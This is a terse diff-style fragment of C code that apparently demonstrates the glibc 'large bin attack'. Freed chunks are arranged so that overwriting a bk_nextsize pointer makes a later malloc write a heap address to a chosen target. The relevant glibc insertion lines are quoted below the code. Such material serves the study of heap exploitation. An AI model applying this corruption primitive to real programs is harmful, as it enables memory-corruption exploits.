@@ -1,0 +1,20 @@
+41  size_t target = 0;
+
+43  size_t *p1 = malloc(0x428);
+45  size_t *g1 = malloc(0x18);
+50  size_t *p2 = malloc(0x418);
+53  size_t *g2 = malloc(0x18);
+
+58  free(p1);
+60  size_t *g3 = malloc(0x438);
+65  free(p2);
+
+72  p1[3] = (size_t)((&target)-4);
+77  size_t *g4 = malloc(0x438);
+
+bck = bin;
+fwd = bck;
+bck = bck->bk;
+victim->fd_nextsize = fwd->fd;
+victim->bk_nextsize = fwd->fd->bk_nextsize;
+fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
